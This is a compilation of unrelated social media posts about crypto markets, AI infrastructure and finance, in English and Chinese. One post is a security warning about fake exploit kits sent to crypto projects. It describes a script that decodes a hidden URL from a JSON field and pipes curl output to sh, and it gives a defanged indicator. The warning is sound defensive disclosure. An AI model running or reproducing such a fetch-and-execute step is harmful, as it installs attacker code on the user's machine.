One more point people mix up. A tokenized deposit is not a stablecoin with a bank logo on it. A stablecoin holder relies on a reserve pool. A JPMD holder has a claim on JPMorgan’s entire balance sheet. Those are different credit questions, and they need different math.

TradFi is coming onchain fast. The bank side is predominantly solid. The token side is where the risk sits, and that's exactly what Credora showcases.

text:
我现在对短线和长线投资的思路，越来越简单：

70%左右的资金只做现货，作为核心仓位。
这部分不频繁折腾，主要吃大趋势。只要大逻辑没变，就不因为短期20%、30%的波动轻易下车。毕竟真正的大行情，往往不是靠频繁操作赚出来的。

20%左右作为机动资金。
原则很简单：不跌到自己的计划成本区域，不轻易加仓；到了预设位置再分批布局。这样做是为了避免越涨越追、越跌越补，最后仓位全部堆在半山腰。

剩下不到10%才拿来玩合约。
合约不是用来翻身的，是用来提高资金利用率和练执行力的。仓位控制在10%以内，同时在持仓数量上做限制，最多同时4个单子。

其中2个可以作为底部长线仓，逻辑没变就拿着；另外2个严格按照短线纪律操作，必须设置止盈止损。

短线单赚钱了，该跑就跑，不因为赚了钱就开始膨胀，更不为了博第二波利润强行过夜。

亏了同样认错，触发止损就走，绝不补仓摊平，更不因为一笔亏损去加大下一笔仓位。

我现在越来越觉得，投资最重要的不是每次都判断对，而是判断错的时候亏得起，判断对的时候拿得住。

仓位分层，本质上就是给自己留后手：
现货吃趋势，机动资金等机会，合约小仓位博弈。

这样即使短线判断错了，也不会影响整个账户的生存能力。

最后一句：不要因为短线的情绪，影响了长期的仓位！

text:
🚨 PSA: threat actors are approaching crypto projects on Telegram, posing as white-hat researchers, offering an “exploit PoC” for your own infra. The PoC contains malware. Our detailed write-up is linked below.

It’s a complete, runnable Solana exploit kit (fork harness, fixtures, the real program binary) so it looks legit. But poc.mjs reads a byte array from a JSON field called UnifiedSignatureInfo, decodes it to a URL, and runs curl -fsSL -k "<url>" | sh.

The decimal array is plain ASCII posing as a Solana signature. Following the README (npm install, start fork, node poc.mjs) is what detonates it. 

IOC: hxxps://162[.]35[.]174[.]231:5000/stage2.

Treat any unsolicited PoC as hostile, review statically in an isolated VM, and never run the setup steps on a box you care about. Report any suspicious reachouts to SEAL.

https://t.co/0rfWwvNwkY

quoted_text:
I never really liked platforms deciding which wallets are "smart money" for me.

A wallet can be up millions and still be completely useless for the way I trade.

So why not decide for myself what makes a wallet worth watching.

That's how Wallet Radar started.

And I can barely code.

Most of the work was just me telling Codex what I wanted, adding rules, removing things I didn't need and changing stuff until it worked the way I wanted.

Wallet Radar scans active tokens and finds the wallets trading them.

But instead of someone else's "smart money" label, I set the rules.

PnL, win rate, trading activity, how recently they traded, number of trades.

Obvious bots and infrastructure wallets get filtered out based on trading patterns and known addresses, not just the number of trades.

Personally, tend to look for wallets with $20k+ realized PnL, 55%+ win rate, 10+ trades, under 5k trades, active in the last 30 days.

What's left I can compare by PnL and activity, look for wallet overlap or use to test different copy-trading ideas.

None of this means blindly copying a wallet.

Sometimes a token leads me to a wallet worth watching.

Sometimes that wallet puts a token on my radar that I wasn't even looking at.

That's mostly how I use it.

Usually I run it once or twice a day to see what wallets are trading and spot tokens I might've missed.

The whole thing runs on CoinGecko API.

Because connecting 4-5 different data sources just to make one tool work would've been a mess.

Prices, DEX pools, trades, liquidity, wallet data — it's all there.

CoinGecko also has MCP and Agent Skill support, so whenever I want to change something, I can just go back to Codex and keep building.

Anyway, I decided to make Wallet Radar public.

Use it as it is, change the rules, break it, build something better.

text:
There’s one thing I keep thinking about with Private AI

Hardware-based privacy has made a lot of it possible, and for many use cases it works well

But for institutions that demand the strictest privacy guarantees, trusting the hardware alone isn’t always enough, as research over the years has shown

For those institutions, there hasn’t been a real alternative

Well, this is exactly what Arcium is addressing with Blackthorn, which just went live in Private Alpha

It replaces the CPU’s hardware-based privacy with cryptography, while the GPU keeps its own hardware protections

It supports Hopper and Blackwell GPUs, with Arcium claiming almost no performance overhead compared to regular AI

I already liked what Arcium was building this year with encrypted computation, but expanding into Private AI is probably the best thing they could do

Especially when you consider how much sensitive information companies are going to process with AI over the next years

Of course, it’s still in Private Alpha, so we’ll have to see how it performs at scale

But I’m insanely bullish on privacy, especially for AI

Good morning best 🤗🔥The market is dominated by the usual rubbish, but the level of hype surrounding memecoins still manages to surprise me.

The official https://t.co/n77gtIpfiM account is celebrating a bloke who apparently made $35 million. It’s a shame that the token has a market cap of $35 million, but a total liquidity of just 1.83 million across all pools. And of that liquidity, a portion is actually made up of the token itself: the amount that can actually be spent in SOL or stablecoins is even lower.

What’s more, this wallet holds 75 per cent of the supply. On paper, that position is worth 26.25 million. But ‘being worth’ that amount on the screen doesn’t mean you can sell it all at that price. If it tried to offload such a large amount, it would cause the price to plummet, and the liquidity wouldn’t come anywhere near being enough to realise that figure.

Market capitalisation, liquidity and realised profits are three different things. Confusing them only serves to sell a nice story to latecomers.

And then you wonder whether altcoins are the future? 😂
Altcoins are used to try and make money when an opportunity arises. Full stop. They aren’t investments to be idolised, and not every figure shown online represents real money.

I’ve been telling you this for years: look at liquidity, understand who holds the supply, and distinguish between profits on paper and those actually realised. Otherwise, you’re not investing: you’re acting as exit liquidity.

author: allscaleio
quoted_text:
Orbit AI × AllScale: Welcoming AI Agents as Customers of Space Services

One photo. An HD recording with Earth as its backdrop. A premiere in space, arranged by AI.
@OrbitAI_OAI and @allscaleio are building Perigee, an AI agent with its own wallet that can buy space services within approved limits. The partnership connects Orbit AI Compute, Space Display, and Eye of God AI with AllScale’s payment tools. Together, they give Perigee the tools to handle real orders: understand a request, buy the services it needs, receive the finished work, and make the final payment.

For Orbit AI, this opens a new way to bring space services to people: letting AI take your ideas into orbit.
To celebrate the partnership, we displayed the @OrbitAI_OAI and @allscaleio  logos on Space Display, the orbital OLED screen aboard Genesis-III. An onboard HD camera captured them with Earth in the background.

Make Earth the Backdrop for Your Ideas

Perigee’s first planned service starts with a photo. A user uploads it and pays, and Perigee handles the order and books a Space Display slot with Orbit AI. The photo appears on the satellite’s screen, an onboard HD camera records it against Earth, and the resulting footage is delivered to the user.
A product launch, a brand statement, or a photo worth remembering can all find a place in orbit through Space Display. The satellite’s screen becomes the stage. Earth becomes the backdrop. The result is real footage from space that you can watch, share, and keep.
Want to showcase your product, brand, or message in space?
https://t.co/d2E7fyoJMr

Orbit AI provides the display and filming services. 
AllScale provides the wallet and payment tools. In the process designed by the two partners, Perigee handles orders within its approved budget, pays after delivery is confirmed, and issues refunds under the agreed terms if delivery fails. From submitting an idea to receiving the footage, an AI agent brings the experience together.

Give AI a View of the World from Space

@OrbitAI_OAI and @allscaleio  are building Perigee to explore how AI assistants can buy and use space services on their own, within an approved budget. AllScale provides the wallet and payment support. Orbit AI opens the door to AI models, satellite observations, and creative displays with Earth as their backdrop.

Are there more ships in the port, or fewer? What has changed around a shipping lane? Has activity around a factory increased? These are questions Perigee could help address in the future. Based on a user’s needs, it could buy satellite imagery and analysis from Eye of God AI, helping uncover clues, understand changes, and support research and decisions.
https://t.co/Gz5EyNamIk

From working through a problem with Orbit AI 

Compute, to observing the world with Eye of God AI, to showcasing ideas through Space Display, the partners are exploring a complete path: letting AI buy the services it needs, turn users’ ideas into tangible results, and put space to practical use.

From One Order to a Million Satellites

Orbit AI has launched three of its own AI computing satellites and connected to more than 100 partner satellites. Through the AllScale partnership, it is exploring how to make these space services easier for people and the Perigee AI agent to buy and use. Perigee also explores how space services can become part of everyday work for businesses, developers, and AI agents that carry out tasks on their own.
Orbit AI’s long-term vision is to build a massive, decentralized space AI computing network connecting one million satellites. In that future, businesses seeking a clearer view of the world, developers looking for AI services, and brands planning a display in space would have an easier way to find and use what they need.
The partnership with AllScale provides a starting point for that vision: giving everyone a chance to bring their ideas into orbit, and every AI assistant a chance to put space to work.

About Orbit AI @OrbitAI_OAI 
We are a space AI company that has launched three proprietary AI computing satellites. Eye of God AI combines satellite imagery with AI to deliver insights and support decisions. Space Display is the world’s first orbital digital media platform. Our long-term vision is to build a massive, decentralized space AI computing network connecting one million satellites, making space an infrastructure layer for next-generation AI.

About AllScale @allscaleio 
We are a self-custodial stablecoin neobank enabling instant, secure, and borderless payments for global businesses. Our end-to-end stablecoin platform covers checkout, invoicing, payroll, and virtual accounts, providing the last-mile infrastructure businesses need to use stablecoins in everyday operations. Built around self-custodial settlement and integrated compliance controls, we help businesses move between stablecoins and local currencies while retaining control of their funds. The AllScale Agent CLI brings the same payment tools to AI agents.

text:
这可能是 Delphi Digital 最近最好的一篇长文：《庄家通吃：为什么投机是未来十年的主题》。

小编看完觉得，重点并不在于它投研了什么新赛道，更像是一种姿态和明示：

别再装价值投资了，大方承认“投机”就是这个时代的刚需。而在一个全民皆赌的时代，最聪明的策略不是去牌桌上挑筹码，你最好直接买下赌场本身。

文章里几个非常刺骨的洞察，以及大量值得细品的数据：

1. 为什么所有人都在赌？因为“正常路径”已经失效

历史上的投机大多由两种引擎驱动：
a.新技术带来的“基建狂热”，如当年的铁路、现在的 AI；
b.阶层固化和法币贬值逼出来的“彩票绝望”,赌一把算了。

而现在，这两个引擎在历史上首次同时全速运转。

对年轻人来说，靠打工存钱买房的传统社会契约已经破产；目前美国首次购房者的中位年龄创下了 40 岁的历史新高，占购房比例降至历史最低的 21%。

存 0 块钱和存 1 万块钱毫无区别，因为都付不起首付。所以，去期权市场、预测市场和土狗盘里博一个 100 倍，成了年轻人在数学上唯一合理的突围方式。

数据显示，80% 冲向高风险资产的 Z 世代坦言，这么做是因为“感觉自己在财务上掉队了”；

过去一年，36% 的 30 岁以下美国年轻男性参与过体育博彩，35 岁以下投资者中有 43% 交易过期权。

2. AI 是生产力，更是最大的“逼赌机器”

这是全文最反直觉的视角。我们总以为 AI 是用来投资的，但报告指出，AI 正在全方位把普通人逼向赌桌。

一方面，微软、谷歌、亚马逊和 Meta 四大巨头 2026 年的资本支出预计高达 7000 +亿元（约占美国 GDP 的 2.3%，是当年电信泡沫顶峰的两倍多）；

另一方面，AI 正在消灭年轻人的上升阶梯。受 AI 冲击最严重的行业中，22-25 岁年轻人的就业率比正常水平低了 19%。

AI 一边在宏观上制造着百年一遇的财富神话，一边在微观上抽干年轻人的出路，直接给“彩票引擎”灌满了汽油。

3. 终极明示：抛弃筹码，去买赌场

既然投机是未来十年的绝对主题，散户的标的（今天炒 AI 算力、明天炒 Meme、后天赌球）会像走马灯一样轮动，绝大部分人最终都会归零。

数据大家也都知道，在 https://t.co/lh7cHMjjiD 发行的超 1900 万个代币中，只有 0.4% 的钱包实现了超 1 万美元的利润。

而“赌场们”正在吸金：

- 2026 年 Q2，Robinhood 光靠“事件合约（预测市场）”就赚了 1.56 亿美元，历史性地超越了它的股票业务和加密业务。

-Kalshi 和 Polymarket 的合并月交易量，从 2025 年中期的 20 亿美元，暴涨了 25 倍，在 2026 年 7 月达到惊人的 530 亿美元。

-Hyperliquid 在 2025 年处理了 3 万亿美元交易量，捕获了 9.72 亿美元的真实手续费，且几乎全部用来在二级市场回购 HYPE，如此财力其实也源自于链上的投资热情。

在文章最后，Delphi 实际上也给 Crypto 重新定了性：

别再纠结区块链到底有什么用，Crypto 最大的真实效用，就是为全球提供了一套零门槛、无休眠、成本低于 2 美元的终极投机基础设施。

叙事会死，代币会归零，但只要年轻人还需要一张改命的彩票，抽水的牌桌就永远印钞。

这就是未来十年最确定的 Alpha。

刚刚的柏林GTC大会上，英伟达CEO黄仁勋的主题演讲刚进行到四分之一，台下几人突然站起来打断他，冲着台上喊话，抗议英伟达硬件出现在乌克兰战场的俄罗斯无人机里。

当时黄仁勋正在台上展示已经全面投产的新一代Vera Rubin计算机，介绍这台机器没有一根线缆、采用百分之百液冷，组装时间从以前的两个小时缩短到了五分钟以内。

据报道，台下的抗议者就在这时站起来高喊：“黄仁勋，在俄罗斯无人机里找到的那些技术，你怎么说？那些是英伟达的芯片。你们打算怎么办？”
他们手里拉开的横幅上写着：“英伟达，把你的脏生意收拾干净。”

乌克兰军方此前在击落的俄罗斯无人机里，确实找到过英伟达的Jetson Orin嵌入式模块。
按照现有的制裁规定，俄罗斯原本根本不该拿到这种硬件。

面对突然闹起来的会场，黄仁勋在台上回应说，这都是重要的问题，我们可以回头再聊，但今天现场坐满了人，全球还有一百场观看活动、一万五千人正看着直播，得先让我把演讲做完。

冲突刚发生时，黄仁勋对着现场保安说：“没事，动作轻点，给她个机会，每个人都有说话的机会。”
紧接着，抗议者手里的横幅就被当场没收，人也被直接请出了会场。

🪵 木头姐的下一条加密投资主线，可能正在从比特币转向整个链上金融体系。

ARK Invest 最新发布的三季度 DeFi 报告，释放了几个值得关注的信号：

1️⃣ 代币化股票正在成为链上交易的新引擎。 三季度现货 DEX 交易量达到 5710 亿美元，环比增长 13%，结束连续四个季度下滑。其中，代币化股票交易量约 500 亿美元，占比升至 9%，达到上一季度的约 9 倍。

2️⃣ Robinhood 正在验证传统金融渠道对加密基础设施的推动力。 Robinhood Chain 上线首季度实现 650 亿美元 DEX 交易量、5100 万美元网络收入。但 ARK 提醒，Gas 机制调整后，其收入可能回落，首季表现未必能持续。

3️⃣ 稳定币与链上借贷仍在扩张。 稳定币调整后交易量增长 16% 至 7810 亿美元；借贷协议存款增长 51% 至 810 亿美元。链上金融不再只有交易，还在延伸至支付、融资和资产管理。

4️⃣ 价值捕获可能更多发生在应用层。 三季度链上应用收入约 5.29 亿美元，高于底层网络的 3.49 亿美元。Hyperliquid 等交易应用，正在证明直接服务用户的协议同样具备可观的收入能力。

木头姐长期押注颠覆传统金融的技术，而这份报告呈现的变化，与她的投资框架高度契合：传统资产上链、稳定币结算，以及金融服务向链上迁移。

不过，交易量增长不等于长期价值已经兑现。代币化股票的监管与流动性、网络收入的可持续性，以及用户能否持续留存，才是下一阶段真正的考验。

如果说上一阶段的加密叙事是资产数字化，那么下一阶段的竞争，可能是整个金融市场的交易与结算基础设施上链。

quoted_text:
看了一下DeepInfer的数。我觉得吧，前几天大家转载的那个SiliconData Index的价格，未来一年估计还得不回头地跌个95%+，具体什么时候影响到GPU Rental rate蛮难预测的。

这个价格体系下，梁圣买张卡估计100天就回本了。一旦有朝一日token价格真的暴跌到影响rental rate，所有股价肯定已经跌了一大轮。

给大家几个数，所有的数都是$ / 1 mm token，基本上1mm token 95% cached = 100-150页的薄书.
- Dylan一直在说Jane Street的变现价是$100-200 USD / 1 mm token
- Opus 5.5 / GPT Astra 的价格在deepinfer的体系下大概是1-2 USD / 1 mm token，比标价便宜个80-95%
- 变态的来了，Deepseek 4.1 Flash off-peak的价格在这是1.5美分，又比SOTA便宜个90%。
- 按照一般的大B300 Cluster，根据deepinfer的计算，一个GPU大概能每小时产出2.7 Bn token, 成本换算过来大概是0.25美分 / 1 mm token，这已经比我想象中便宜很多很多了。之前算过我记得是15美分 / 1 mm token，不过没有计算cache。这个level的成本大概率是大机房+高使用率+超高存储时间，一般机房估计都做不到这个theoratical.
- 这也就是大家看到的80-85%毛利 (1.5 / 0.25)。DeepSeek要是以比这个利润率稍好的功率赚钱的话，一个B300大概2-3个月回本，而不是8个月。真是无与伦比的暴利，比贩毒爽多了，自然是砸锅卖铁也要走私B300。
- 如果B300按照break even算的话，那么成本大概是0.13美分 / 1 mm token. 然后原材料其实是B300 ～600k价格的6%不到（按照产业链毛利计算）。
- 所以最后算下来马斯克如果去完全积压的话，每1mm token的最终生产成本可能是0.01美分, or 0.0001 USD。这基本上跟免费差不了太多了。

这种屠夫版的价格我不知道你怎么看，但是when you see the headline API price of Opus @ 8/40 USD  input/output，我只能感觉说只要OSS + Post-train和中国模型蒸馏大法能够持续跟随 + 没有新的breakthrough，token 价格未来一段时间应该是以断崖式的下跌。至于什么时候触碰到rental rate, maybe someone smart can tell me.
